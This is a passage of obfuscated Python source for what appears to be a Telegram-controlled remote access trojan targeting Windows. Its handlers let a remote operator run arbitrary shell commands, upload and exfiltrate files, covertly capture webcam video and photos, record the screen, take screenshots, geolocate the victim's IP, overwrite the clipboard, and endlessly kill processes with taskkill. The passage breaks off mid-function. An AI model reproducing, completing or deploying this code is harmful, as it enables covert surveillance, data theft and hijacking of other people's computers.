	with F (OO0OOO0OOO000000O ,K )as OOOO00OOO0OO0OOOO :A .send_audio (O00000OOO0OOOO0OO .chat .id ,OOOO00OOO0OO0OOOO )#line:496
	B .remove (OO0OOO0OOO000000O )#line:497
@A .message_handler (commands =['metadata'])#line:498
def DN (OO0O00000OO00OOO0 ):#line:499
	O00OOO0OOO00O00O0 =OO0O00000OO00OOO0 ;O00O000000O0OOO00 =O00OOO0OOO00O00O0 .text .split ('/metadata',1 )[1 ].strip ()#line:500
	if not B .path .exists (O00O000000O0OOO00 ):A .send_message (O00OOO0OOO00O00O0 .chat .id ,'Error: File does not exist');return #line:501
	try :OO0000O00O0OO000O =B .stat (O00O000000O0OOO00 );OOOO00O000OOO000O =R .ctime (OO0000O00O0OO000O [A2 .ST_MTIME ]);O0OO000O000OO000O =OO0000O00O0OO000O [A2 .ST_SIZE ]/1048576 ;O0OO000O000OO000O =round (O0OO000O000OO000O ,2 );O0O0OOOOO00O0OO0O =R .ctime (OO0000O00O0OO000O [A2 .ST_ATIME ]);OOOOO0O0OO00OO0O0 =f"Last modified: {OOOO00O000OOO000O}\n";OOOOO0O0OO00OO0O0 +=f"Size in MB: {O0OO000O000OO000O} MB\n";OOOOO0O0OO00OO0O0 +=f"Last accessed: {O0O0OOOOO00O0OO0O}\n";A .send_message (O00OOO0OOO00O00O0 .chat .id ,OOOOO0O0OO00OO0O0 )#line:502
	except C as O0OO0OO0OOOO000O0 :A .send_message (O00OOO0OOO00O00O0 .chat .id ,f"Error: {E(O0OO0OO0OOOO000O0)}")#line:503
@A .message_handler (commands =['minimize'])#line:504
def DO (OOO00OOO00O0O0O0O ):#line:505
	O000OO0OO0OO00O00 =OOO00OOO00O0O0O0O #line:506
	try :D .hotkey (g ,e );A .send_message (O000OO0OO0OO00O00 .chat .id ,'The active window has been minimized!');A .send_message (O000OO0OO0OO00O00 .chat .id ,'Type the command again to minimize the window to the taskbar.')#line:507
	except C as O0OOO0O0O0OO0OO0O :A .send_message (O000OO0OO0OO00O00 .chat .id ,f"Error: {O0OOO0O0O0OO0OO0O}")#line:508
@A .message_handler (commands =['maximize'])#line:509
def DP (OO00OOO0O0O00O0OO ):#line:510
	OOO0O0000OOO0O0O0 =OO00OOO0O0O00O0OO #line:511
	try :D .hotkey (g ,f );A .send_message (OOO0O0000OOO0O0O0 .chat .id ,'The active window has been maximized!')#line:512
	except C as OO0O000O0O00OOO0O :A .send_message (OOO0O0000OOO0O0O0 .chat .id ,f"Error: {OO0O000O0O00OOO0O}")#line:513
@A .message_handler (commands =['github'])#line:514
def DQ (O0OOOO0OO00O0O0OO ):O00OO0OO0O0OOOOO0 =O0OOOO0OO00O0O0OO ;A .send_message (O00OO0OO0O0OOOOO0 .chat .id ,'My github:');A .send_message (O00OO0OO0O0OOOOO0 .chat .id ,'[**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')#line:515
@A .message_handler (commands =['cmdbomb'])#line:516
def DR (OO0O000O00O0O000O ):#line:517
	OO00000OO00O00OO0 =OO0O000O00O0O000O #line:518
	try :B .popen ('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd');A .send_message (OO00000OO00O00OO0 .chat .id ,'Opened 10 CMD windows!')#line:519
	except C as OO00OO00O00O0000O :A .send_message (OO00000OO00O00OO0 .chat .id ,f"Error: {OO00OO00O00O0000O}")#line:520
Y =L #line:521
@A .message_handler (commands =['upload'])#line:522
def DS (O0OOOO0O000000O00 ):global Y ;Y =J ;A .send_message (O0OOOO0O000000O00 .chat .id ,'Please send your file:')#line:523
@A .message_handler (content_types =['document','photo','audio','video','voice'])#line:524
def DT (O00OO000OO0000OO0 ):#line:525
	O00000OOO0O0OOO0O =O00OO000OO0000OO0 ;global Y #line:526
	if Y :#line:527
		try :#line:528
			O00OOOOOOOOOO0OO0 =O00000OOO0O0OOO0O .document .file_name if O00000OOO0O0OOO0O .document else O00000OOO0O0OOO0O .photo .file_name ;OOO00OOOO0000OO0O =A .get_file (O00000OOO0O0OOO0O .document .file_id )if O00000OOO0O0OOO0O .document else A .get_file (O00000OOO0O0OOO0O .photo [-1 ].file_id );O0OO00O0O0O00O0O0 =A .download_file (OOO00OOOO0000OO0O .file_path )#line:529
			with F (O00OOOOOOOOOO0OO0 ,'wb')as OO00O00OO0O0O0O0O :OO00O00OO0O0O0O0O .write (O0OO00O0O0O00O0O0 )#line:530
			O00000O00OO0O000O =B .getcwd ();A .send_message (O00000OOO0O0OOO0O .chat .id ,f"File has been sent successfully in: {O00000O00OO0O000O}");Y =L #line:531
		except C as O0O00OO00OOO00O00 :A .send_message (O00000OOO0O0OOO0O .chat .id ,f"Error: {O0O00OO00OOO00O00}")#line:532
	else :A .send_message (O00000OOO0O0OOO0O .chat .id ,'Please enter the /upload command first')#line:533
@A .message_handler (commands =['altf4'])#line:534
def DU (OO0O000O0OOOOO000 ):#line:535
	OOOO00OOOOOO0O0OO =OO0O000O0OOOOO000 #line:536
	try :D .hotkey (d ,w );A .send_message (OOOO00OOOOOO0O0OO .chat .id ,'ALT + F4 was pressed successfully')#line:537
	except C as OO00000O0O00OO000 :A .send_message (OOOO00OOOOOO0O0OO .chat .id ,f"Error: {OO00000O0O00OO000}")#line:538
@A .message_handler (commands =['run'])#line:539
def DV (OO000OOO00OOOOO00 ):#line:540
	OOO0O0OO0OOO0OOOO =OO000OOO00OOOOO00 #line:541
	try :O00OO00OOO00OO00O =OOO0O0OO0OOO0OOOO .text .split ('/run',1 )[1 ].strip ();B .popen (f"start {E(O00OO00OOO00OO00O)}");A .send_message (OOO0O0OO0OOO0OOOO .chat .id ,'File opened successfully!')#line:542
	except C as O0OO0O0O0O0OO00O0 :A .send_message (OOO0O0OO0OOO0OOOO .chat .id ,f"Error:{O0OO0O0O0O0OO00O0}")#line:543
@A .message_handler (commands =['changeclipboard'])#line:544
def DW (OO0O0OO0OO00O00O0 ):#line:545
	OO0O0OOO0O000O0O0 =OO0O0OO0OO00O00O0 #line:546
	try :OO0OO0O000OOO00OO =OO0O0OOO0O000O0O0 .text .split ('/changeclipboard',1 )[1 ].strip ();OO000O00O00O0000O ='echo | set /p nul='+OO0OO0O000OOO00OO .strip ()+'| clip';B .system (OO000O00O00O0000O );A .send_message (OO0O0OOO0O000O0O0 .chat .id ,f'Clipboard was changed to "{OO0OO0O000OOO00OO}" successfully!')#line:547
	except C as O0000OOO0000O0OO0 :A .send_message (OO0O0OOO0O000O0O0 .chat .id ,f"Error: {O0000OOO0000O0OO0}")#line:548
@A .message_handler (commands =['wallpaper'])#line:549
def DX (O00OO00O00OO00O0O ):O00O0OOO0OO00O000 =O00OO00O00OO00O0O ;A .send_message (O00O0OOO0OO00O000 .chat .id ,'First run /upload and upload picture');A .send_message (O00O0OOO0OO00O000 .chat .id ,"Then send name of photo to change desktop's wallpaper:");A .register_next_step_handler (O00O0OOO0OO00O000 ,Cp )#line:550
def Cp (OOOOO00OOOOOOO0OO ):#line:551
	O000O00O00O0OOO00 =OOOOO00OOOOOOO0OO ;OOO0O0O0O00O0OO00 =O000O00O00O0OOO00 .text #line:552
	if not OOO0O0O0O00O0OO00 .startswith (q ):#line:553
		try :I .windll .user32 .SystemParametersInfoW (20 ,0 ,B .path .abspath (E (OOO0O0O0O00O0OO00 )),0 );A .send_message (O000O00O00O0OOO00 .chat .id ,"Desktop's wallpaper successfully changed!")#line:554
		except C as O000O00000OOO0O00 :A .send_message (O000O00O00O0OOO00 .chat .id ,f"Error{O000O00000OOO0O00}")#line:555
@A .message_handler (commands =['download'])#line:556
def DY (OOOO0O0OO00OO0O00 ):#line:557
	OOO0OOO0O0O0OOO0O =OOOO0O0OO00OO0O00 ;OOO0OO00O00O00O00 =OOO0OOO0O0O0OOO0O .text .split ('/download',1 )[1 ].strip ()#line:558
	try :#line:559
		with F (OOO0OO00O00O00O00 ,K )as OOOO0O000O0OO0OOO :#line:560
			if E (OOO0OO00O00O00O00 [-3 :])=='png':A .send_photo (OOO0OOO0O0O0OOO0O .chat .id ,OOOO0O000O0OO0OOO )#line:561
			elif E (OOO0OO00O00O00O00 [-3 :])=='jpg':A .send_photo (OOO0OOO0O0O0OOO0O .chat .id ,OOOO0O000O0OO0OOO )#line:562
			elif E (OOO0OO00O00O00O00 [-3 :])=='svg':A .send_photo (OOO0OOO0O0O0OOO0O .chat .id ,OOOO0O000O0OO0OOO )#line:563
			elif E (OOO0OO00O00O00O00 [-3 :])=='jpeg':A .send_photo (OOO0OOO0O0O0OOO0O .chat .id ,OOOO0O000O0OO0OOO )#line:564
			elif E (OOO0OO00O00O00O00 [-3 :])=='mkv':A .send_video (OOO0OOO0O0O0OOO0O .chat .id ,OOOO0O000O0OO0OOO ,timeout =100 )#line:565
			else :A .send_document (OOO0OOO0O0O0OOO0O .chat .id ,OOOO0O000O0OO0OOO )#line:566
	except C as OOO00OOOO000O0O00 :A .send_message (OOO0OOO0O0O0OOO0O .chat .id ,f"Error{OOO00OOOO000O0O00}")#line:567
@A .message_handler (commands =['fullvolume'])#line:568
def Cq (O0OO00O0OOOOO000O ):#line:569
	OO0O0OO00OO00OOO0 =O0OO00O0OOOOO000O #line:570
	try :#line:571
		O000O0OOO00000O0O =0 #line:572
		while O000O0OOO00000O0O <70 :D .press (N );O000O0OOO00000O0O +=1 #line:573
		A .send_message (OO0O0OO00OO00OOO0 .chat .id ,'successfully full!')#line:574
	except C as O000OO0OOO0OO0000 :A .send_message (OO0O0OO00OO00OOO0 .chat .id ,f"Error{O000OO0OOO0OO0000}")#line:575
@A .message_handler (commands =['volumeplus'])#line:576
def Cq (O00OO00OO000000OO ):#line:577
	OO0OOO00O0000000O =O00OO00OO000000OO #line:578
	try :D .press (N );D .press (N );D .press (N );D .press (N );D .press (N );A .send_message (OO0OOO00O0000000O .chat .id ,'successfully +10')#line:579
	except C as OO0O00O0000O0000O :A .send_message (OO0OOO00O0000000O .chat .id ,f"Error{OO0O00O0000O0000O}")#line:580
@A .message_handler (commands =['volumeminus'])#line:581
def DZ (OO000OOO0OOOOO0O0 ):#line:582
	O0OO0O0OO000OOOO0 =OO000OOO0OOOOO0O0 #line:583
	try :D .press (Q );D .press (Q );D .press (Q );D .press (Q );D .press (Q );A .send_message (O0OO0O0OO000OOOO0 .chat .id ,'successfully -10')#line:584
	except C as OOO0OO0O0O00OOO00 :A .send_message (O0OO0O0OO000OOOO0 .chat .id ,f"Error{OOO0OO0O0O00OOO00}")#line:585
@A .message_handler (commands =['webcam'])#line:586
def Da (O0O0OOOO00OOOOO0O ):OOOOO0O0000OO0O00 =O0O0OOOO00OOOOO0O ;A .send_message (OOOOO0O0000OO0O00 .chat .id ,'Switch the camera (0 is default camera)');O00O00000OO00O0OO =A .send_message (OOOOO0O0000OO0O00 .chat .id ,'Enter 0, 1, or another index:');A .register_next_step_handler (O00O00000OO00O0OO ,lambda O0OO00OO00O000000 :Cr (O0OO00OO00O000000 ,O (O0OO00OO00O000000 .text )))#line:587
def Cr (O0O00OO00OOOOO0O0 ,OO00OO0O0000OO0O0 ):OOO0OO00OOOO0OO00 =A .send_message (O0O00OO00OOOOO0O0 .chat .id ,C8 );A .register_next_step_handler (OOO0OO00OOOO0OO00 ,lambda OOOOO0O0OO0O0O0OO :Cs (OOOOO0O0OO0O0O0OO ,OO00OO0O0000OO0O0 ,O (OOOOO0O0OO0O0O0OO .text )))#line:588
def Cs (OOO00O000O0O0OOO0 ,OOOOO0O0O0OOO00OO ,OO0OOOO0O0O0OOOO0 ):#line:589
	O000000OO00OOOOO0 =OOO00O000O0O0OOO0 ;A .send_message (O000000OO00OOOOO0 .chat .id ,Bg );OO0000OOO0O0OO0O0 =H .VideoCapture (OOOOO0O0O0OOO00OO );OOOOOO0OOOOO0OOO0 =H .VideoWriter_fourcc (*'XVID');OO0O0OO0OOO00OOO0 =i ;O000O0O0O000O0O00 =H .VideoWriter (OO0O0OO0OOO00OOO0 ,OOOOOO0OOOOO0OOO0 ,2e1 ,(640 ,480 ));OOO0O00O000O000O0 =R .time ()#line:590
	while J :#line:591
		O0OO0OOO000000OO0 ,O0O00OO000O00O0O0 =OO0000OOO0O0OO0O0 .read ()#line:592
		if O0OO0OOO000000OO0 :#line:593
			O000O0O0O000O0O00 .write (O0O00OO000O00O0O0 )#line:594
			if R .time ()-OOO0O00O000O000O0 >OO0OOOO0O0O0OOOO0 :break #line:595
		else :break #line:596
	OO0000OOO0O0OO0O0 .release ();O000O0O0O000O0O00 .release ();H .destroyAllWindows ()#line:597
	try :#line:598
		with F (OO0O0OO0OOO00OOO0 ,K )as O0OOO0O00O0OOO000 :A .send_document (O000000OO00OOOOO0 .chat .id ,O0OOO0O00O0OOO000 ,timeout =122 )#line:599
	except C as OO0OO00O000O000O0 :A .send_message (O000000OO00OOOOO0 .chat .id ,f"Error: {OO0OO00O000O000O0}")#line:600
	B .remove (i )#line:601
@A .message_handler (commands =[x ])#line:602
def help (O00O0OO00O00O0000 ):#line:603
	OO0OO00000O000OOO =O00O0OO00O00O0000 #line:604
	if T ==L :A .send_message (OO0OO00000O000OOO .chat .id ,Bw );A .register_next_step_handler (OO0OO00000O000OOO ,Ct )#line:605
	else :A .send_message (OO0OO00000O000OOO .chat .id ,Bp )#line:606
def Ct (OOOOOOO00OOOO0OO0 ):#line:607
	OO00O0000O0000O00 =OOOOOOO00OOOO0OO0 #line:608
	if OO00O0000O0000O00 .text =='acd':global T ;T =J ;A .send_message (OO00O0000O0000O00 .chat .id ,Bz );A .send_message (OO00O0000O0000O00 .chat .id ,Bp )#line:609
	else :A .send_message (OO00O0000O0000O00 .chat .id ,B_ )#line:610
@A .message_handler (commands =['examples'])#line:611
def Db (O0000O000O000000O ):A .send_message (O0000O000O000000O .chat .id ,Ci )#line:612
@A .message_handler (commands =['textspech'])#line:613
def Cu (O0000O0OO0OO0OO0O ):#line:614
	O0O0O0O000OOO00O0 =O0000O0OO0OO0OO0O #line:615
	try :O0OO00OO0OOO0OOO0 =O0O0O0O000OOO00O0 .text .split ('/textspech',1 )[1 ].strip ();OO0OO0OOO0O00O0O0 =pyttsx3 .init ();OO0OO0OOO0O00O0O0 .say (O0OO00OO0OOO0OOO0 );OO0OO0OOO0O00O0O0 .runAndWait ();A .send_message (O0O0O0O000OOO00O0 .chat .id ,f"{O0OO00OO0OOO0OOO0}  sended successfully!")#line:616
	except C as OOO00000OOO0OO0O0 :A .send_message (O0O0O0O000OOO00O0 .chat .id ,f"Error: {OOO00000OOO0OO0O0}")#line:617
@A .message_handler (commands =['screenrecord'])#line:618
def Cu (OO0OO0OOOO0O0O0O0 ):O0O0OO00O00OO00O0 =A .send_message (OO0OO0OOOO0O0O0O0 .chat .id ,C8 );A .register_next_step_handler (O0O0OO00O00OO00O0 ,Cv )#line:619
def Cv (OOO00OO0OOO0OO000 ):#line:620
	OOOOO00OO00OO0OO0 =OOO00OO0OOO0OO000 ;A .send_message (OOOOO00OO00OO0OO0 .chat .id ,Bg );O0O00OOO000000000 ,OO00OO0O00000O000 =D .size ();O000000000OOO0O00 =H .VideoWriter_fourcc (*'XVID');O00O00OOO0OOO00O0 =H .VideoWriter (i ,O000000000OOO0O00 ,1e1 ,(O0O00OOO000000000 ,OO00OO0O00000O000 ));OOO0O0OO0OOOOOOO0 =R .time ()#line:621
	while J :#line:622
		O0OOO0OOO00O0O0OO =D .screenshot ();O000OOO00OOO00O0O =Ce .array (O0OOO0OOO00O0O0OO );O000OOO00OOO00O0O =H .cvtColor (O000OOO00OOO00O0O ,H .COLOR_RGB2BGR );O00O00OOO0OOO00O0 .write (O000OOO00OOO00O0O )#line:623
		if R .time ()-OOO0O0OO0OOOOOOO0 >O (OOOOO00OO00OO0OO0 .text ):break #line:624
	O00O00OOO0OOO00O0 .release ();H .destroyAllWindows ()#line:625
	try :#line:626
		with F (i ,K )as O000OOO000O0OOO0O :A .send_document (OOOOO00OO00OO0OO0 .chat .id ,O000OOO000O0OOO0O ,timeout =122 )#line:627
	except C as O0O0000000O00OO00 :A .send_message (OOOOO00OO00OO0OO0 .chat .id ,f"Error:{O0O0000000O00OO00}")#line:628
	B .remove (i )#line:629
@A .message_handler (commands =['info'])#line:630
def Dc (OO0OOO0OOO0O00OO0 ):#line:631
	O00OOOO00OO00OO0O =OO0OOO0OOO0O00OO0 #line:632
	try :OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/ip').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Ip:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/city').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"City:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/region').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Region:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/country').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Country:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/loc').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Location:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/org').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Provider:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/postal').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Postal:\n {OOOOO0O00OO000O00}");OOOOO0O00OO000O00 =B .popen ('curl ipinfo.io/timezone').read ().strip ();A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Timezone:\n {OOOOO0O00OO000O00}")#line:633
	except C as O000O000O00OOOOO0 :A .send_message (O00OOOO00OO00OO0O .chat .id ,f"Error:{O000O000O00OOOOO0}")#line:634
@A .message_handler (commands =['winblocker'])#line:635
def Cw (O0OOO0OO0OOOO000O ):#line:636
	O00OO0O000000O00O =O0OOO0OO0OOOO000O ;A .send_message (O00OO0O000000O00O .chat .id ,C9 )#line:637
	while J :#line:638
		O00OOOO0OOO00O0OO =B .popen (CA ).read ().strip ();O0OO00O0000OO0OO0 =[CB ,CC ,CD ,A1 ,CE ,CF ,CG ,CH ,CI ,CJ ,CK ,CL ,CM ,CN ,CO ,CP ,CQ ,CR ,CS ,CT ,CU ,CV ,CW ,CX ,CY ,CZ ,Ca ,Cb ,Cc ,Cd ]#line:639
		for O0OO0O00O0OO0O00O in O0OO00O0000OO0OO0 :#line:640
			if O0OO0O00O0OO0O00O in O00OOOO0OOO00O0OO :#line:641
				if O0OO0O00O0OO0O00O ==A1 :0 #line:642
				else :A .send_message (O00OO0O000000O00O .chat .id ,f"{O0OO0O00O0OO0O00O} is killed!")#line:643
				B .popen (f"taskkill /f /im {O0OO0O00O0OO0O00O}")#line:644
@A .message_handler (commands =['winblocker2'])#line:645
def Cw (O00O00O0OOOO00O0O ):#line:646
	OO0000OOOO0000000 =O00O00O0OOOO00O0O ;A .send_message (OO0000OOOO0000000 .chat .id ,C9 )#line:647
	while J :#line:648
		OOO0OOOOO0O000O00 =B .popen (Bh ).read ().strip ();O0O0OO000O00OO0OO =[CB ,CC ,CD ,A1 ,CE ,CF ,CG ,CH ,CI ,CJ ,CK ,CL ,CM ,CN ,CO ,CP ,CQ ,CR ,CS ,CT ,CU ,CV ,CW ,CX ,CY ,CZ ,Ca ,Cb ,Cc ,Cd ]#line:649
		for OOOOOO0OOOOO0O00O in O0O0OO000O00OO0OO :#line:650
			if OOOOOO0OOOOO0O00O in OOO0OOOOO0O000O00 :#line:651
				if OOOOOO0OOOOO0O00O ==A1 :0 #line:652
				else :A .send_message (OO0000OOOO0000000 .chat .id ,f"{OOOOOO0OOOOO0O00O} is killed!")#line:653
				B .popen (f"taskkill /f /im {OOOOOO0OOOOO0O00O}")#line:654
@A .message_handler (commands =['playsound'])#line:655
def Dd (OOOO0O00OOO0000OO ):#line:656
	O00OO0O0OOOO0O000 =OOOO0O00OOO0000OO #line:657
	try :OOO00OOOO00O0O000 =O00OO0O0OOOO0O000 .text .split ('/playsound',1 )[1 ].strip ();B .popen (f"start {OOO00OOOO00O0O000}");A .send_message (O00OO0O0OOOO0O000 .chat .id ,'Music started playing in pc successfully')#line:658
	except C as O000O0O0OOOO00OO0 :A .send_message (O00OO0O0OOOO0O000 .chat .id ,f"Error:{O000O0O0OOOO00OO0}")#line:659
@A .message_handler (commands =['chrome'])#line:660
def Bu (OO000000OO0000O0O ):#line:661
	OO000OO0OOO00000O =OO000000OO0000O0O #line:662
	try :OO0O00O00O000O0O0 =OO000OO0OOO00000O .text .split ('/chrome',1 )[1 ].strip ();B .popen (f'start chrome "{OO0O00O00O000O0O0}"');A .send_message (OO000OO0OOO00000O .chat .id ,f"Site:{OO0O00O00O000O0O0} has opened successfully")#line:663
	except C as O0O0OOO0OOOOO0OOO :A .send_message (OO000OO0OOO00000O .chat .id ,f"Error:{O0O0OOO0OOOOO0OOO}")#line:664
@A .message_handler (commands =['edge'])#line:665
def Bu (OOOOOO000OO0OOO00 ):#line:666
	O0O0000O0OOOO00O0 =OOOOOO000OO0OOO00 #line:667
	try :OOOO0O0OOO0OOO0O0 =O0O0000O0OOOO00O0 .text .split ('/edge',1 )[1 ].strip ();B .popen (f'start msedge "{OOOO0O0OOO0OOO0O0}"');A .send_message (O0O0000O0OOOO00O0 .chat .id ,f"Site:{OOOO0O0OOO0OOO0O0} has opened successfully")#line:668
	except C as O0O0O0O0O0O000O0O :A .send_message (O0O0000O0OOOO00O0 .chat .id ,f"Error:{O0O0O0O0O0O000O0O}")#line:669
@A .message_handler (commands =['firefox'])#line:670
def Bu (OOO000000000OO00O ):#line:671
	O0OO000OOOOOO00OO =OOO000000000OO00O #line:672
	try :OOO00O00O0OO0O00O =O0OO000OOOOOO00OO .text .split ('/firefox',1 )[1 ].strip ();B .popen (f'start firefox "{OOO00O00O0OO0O00O}"');A .send_message (O0OO000OOOOOO00OO .chat .id ,f"Site:{OOO00O00O0OO0O00O} has opened successfully")#line:673
	except C as OOO00OO0O000O00O0 :A .send_message (O0OO000OOOOOO00OO .chat .id ,f"Error:{OOO00OO0O000O00O0}")#line:674
@A .message_handler (commands =['webscreen'])#line:675
def De (OO0O00O00000OOO0O ):#line:676
	OOO00O00O000000O0 =OO0O00O00000OOO0O #line:677
	try :#line:678
		OO0OOO00OOO0OOO0O =H .VideoCapture (0 );OOOOOO0OOO00OOOO0 ,O00O0O0OOO000000O =OO0OOO00OOO0OOO0O .read ();OOOO0O0O00O0OO00O ='photo.jpg';H .imwrite (OOOO0O0O00O0OO00O ,O00O0O0OOO000000O )#line:679
		with F (OOOO0O0O00O0OO00O ,K )as O0O000O00O0OOO000 :A .send_photo (OOO00O00O000000O0 .chat .id ,O0O000O00O0OOO000 )#line:680
		B .remove (OOOO0O0O00O0OO00O );OO0OOO00OOO0OOO0O .release ()#line:681
	except C as O00OOOOOO0OO00OO0 :A .send_message (OOO00O00O000000O0 .chat .id ,f"Error capturing photo: {O00OOOOOO0OO00OO0}")#line:682
@A .message_handler (commands =['screenshot'])#line:683
def Df (O0OOOO000OOOO00OO ):#line:684
	OOOO00O0OOO0O0O00 =O0OOOO000OOOO00OO #line:685
	try :#line:686
		O00OO0O0OO0OO00OO ='screenshot.png';D .screenshot (O00OO0O0OO0OO00OO )#line:687
		with F (O00OO0O0OO0OO00OO ,K )as OOO000OOOOO0O0OOO :A .send_photo (OOOO00O0OOO0O0O00 .chat .id ,OOO000OOOOO0O0OOO )#line:688
		B .remove (O00OO0O0OO0OO00OO )#line:689
	except C as O000000000O00OO00 :A .send_message (OOOO00O0OOO0O0O00 .chat .id ,f"Error :(: {O000000000O00OO00}")#line:690
A4 =B .getcwd ()#line:691
@A .message_handler (commands =[A0 ])#line:692
def Dg (OO00OOOO0O0OOOOOO ):#line:693
	O00OOO000O0O00OOO =OO00OOOO0O0OOOOOO #line:694
	try :I .windll .PowrProf .SetSuspendState (0 ,1 ,0 );A .send_message (O00OOO000O0O00OOO .chat .id ,'Pc is sendend to sleep mode!')#line:695
	except C as OOO000OO0O00O00O0 :A .send_message (O00OOO000O0O00OOO .chat .id ,f"Error :(: {OOO000OO0O00O00O0}")#line:696
@A .message_handler (commands =['cd'])#line:697
def Dh (OO0OOO00O0O0OO0O0 ):#line:698
	OOOOO000O000OO00O =OO0OOO00O0O0OO0O0 #line:699
	try :global A4 ;OO0OOOO0O0O0O0O0O =OOOOO000O000OO00O .text .split ('/cd',1 )[1 ].strip ();B .chdir (OO0OOOO0O0O0O0O0O );A4 =B .getcwd ();A .send_message (OOOOO000O000OO00O .chat .id ,f"You are in this directory:\n{A4}")#line:700
	except C as OO000000OOOO000O0 :A .send_message (OOOOO000O000OO00O .chat .id ,f"This directory does not exists: {OO000000OOOO000O0}")#line:701
@A .message_handler (commands =[n ])#line:702
def Di (OOO0000O00O000OO0 ):OO0O0OO0OOOOOO000 =B .popen (n ).read ().strip ();A .send_message (OOO0000O00O000OO0 .chat .id ,f"result: {OO0O0OO0OOOOOO000}")#line:703
Z =L #line:704
def Cx (O0O00O00O0O0OO00O ):#line:705
	O00OO00OO0OO0OOO0 =O0O00O00O0O0OO00O ;global Z #line:706
	try :#line:707
		if O00OO00OO0OO0OOO0 .lower ()=='exit':Z =L ;return 'Exit'#line:708
		elif O00OO00OO0OO0OOO0 .lower ()==Bi :O0O000O000OOOO0O0 =B .getcwd ();OO00O0O0OOO00O0O0 =B .path .abspath (B .path .join (O0O000O000OOOO0O0 ,B .pardir ));B .chdir (OO00O0O0OOO00O0O0 );return f"You are in: {OO00O0O0OOO00O0O0}"#line:709
		elif O00OO00OO0OO0OOO0 .lower ().startswith (Bj ):O0OOOO0O0O0O00OO0 =O00OO00OO0OO0OOO0 .lower ().split (' ',1 )[1 ].strip ();B .chdir (O0OOOO0O0O0O00OO0 );return f"You are in: {O0OOOO0O0O0O00OO0}"#line:710
		else :OOO0O000OOOOOOO00 =B .popen (O00OO00OO0OO0OOO0 .lower ()).read ();return f"Result:\n\n{OOO0O000OOOOOOO00}"#line:711
	except C as O000000OO0000OOO0 :return f"Error:\n\n{O000000OO0000OOO0}"#line:712
@A .message_handler (commands =[v ])#line:713
def Dj (O00OO00OO00O0OOO0 ):global Z ;Z =J ;A .send_message (O00OO00OO00O0OOO0 .chat .id ,'Enter  your command(enter "exit", if you want to exit):')#line:714
@A .message_handler (func =lambda O0OOOO0OOO000O0O0 :Z )#line:715
def Dk (OOO0OOO000000O000 ):O0O0000O0OOOO0000 =OOO0OOO000000O000 ;O000O0O000OO00O00 =Cx (O0O0000O0OOOO0000 .text );A .send_message (O0O0000O0OOOO0000 .chat .id ,O000O0O000OO00O00 )#line:716
@A .message_handler (commands =['shellexecute'])#line:717
def a (OO0OOO00O0O00OO00 ):OO0000O0O000OO00O =OO0OOO00O0O00OO00 ;OOO000O0O000OOOOO =OO0000O0O000OO00O .text .split ('/shellexecute',1 )[1 ].strip ();OO0000O00OO0O0000 =B .popen (OOO000O0O000OOOOO ).read ();A .send_message (OO0000O0O000OO00O .chat .id ,f"Result of command:\n\n{OO0000O00OO0O0000}")#line:718
@A .message_handler (commands =[s ])#line:719
def a (OOO0O0O0000OOOO0O ):#line:720
	OO000O0000000000O =OOO0O0O0000OOOO0O #line:721
	try :#line:722
		O0OOOOO0O00OOOO00 =OO000O0000000000O .text .split ('/e',1 )[1 ].strip ()#line:723
		if O0OOOOO0O00OOOO00 ==Bi :OO00O0O0OO00O00OO =B .getcwd ();OO0000O0O0O00O0O0 =B .path .abspath (B .path .join (OO00O0O0OO00O00OO ,B .pardir ));B .chdir (OO0000O0O0O00O0O0 );A .send_message (OO000O0000000000O .chat .id ,f"You are in: {OO0000O0O0O00O0O0}")#line:724
		elif O0OOOOO0O00OOOO00 .startswith (Bj ):OO00O00OOO00O00O0 =O0OOOOO0O00OOOO00 .split (' ',1 )[1 ].strip ();B .chdir (OO00O00OOO00O00O0 );A .send_message (OO000O0000000000O .chat .id ,f"You are in: {OO00O00OOO00O00O0}")#line:725
		else :OO0OO000O0OO0O000 =B .popen (O0OOOOO0O00OOOO00 ).read ();A .send_message (OO000O0000000000O .chat .id ,f"Result:\n\n{OO0OO000O0OO0O000}")#line:726
	except C as OOO00O000O0O0OOOO :A .send_message (OO000O0000000000O .chat .id ,f"Error:\n\n{OOO00O000O0O0OOOO}")#line:727
U =4096 #line:728
@A .message_handler (commands =['ex'])#line:729
def a (O0000O0O000OO00OO ):#line:730
	OOOOOOO0O0OOOOOO0 =O0000O0O000OO00OO #line:731
	try :#line:732
		OO0O000O00O0O0000 =OOOOOOO0O0OOOOOO0 .text .split ('/ex',1 )[1 ].strip ()#line:733
		if OO0O000O00O0O0000 ==Bi :OO0OO000O0000OO00 =B .getcwd ();O0OOOO0O00O000O00 =B .path .abspath (B .path .join (OO0OO000O0000OO00 ,B .pardir ));B .chdir (O0OOOO0O00O000O00 );A .send_message (OOOOOOO0O0OOOOOO0 .chat .id ,f"You are in: {O0OOOO0O00O000O00}")#line:734
		elif OO0O000O00O0O0000 .startswith (Bj ):O00OO0OOOOOO0O000 =OO0O000O00O0O0000 .split (' ',1 )[1 ].strip ();B .chdir (O00OO0OOOOOO0O000 );A .send_message (OOOOOOO0O0OOOOOO0 .chat .id ,f"You are in: {B.getcwd()}")#line:735
		else :#line:736
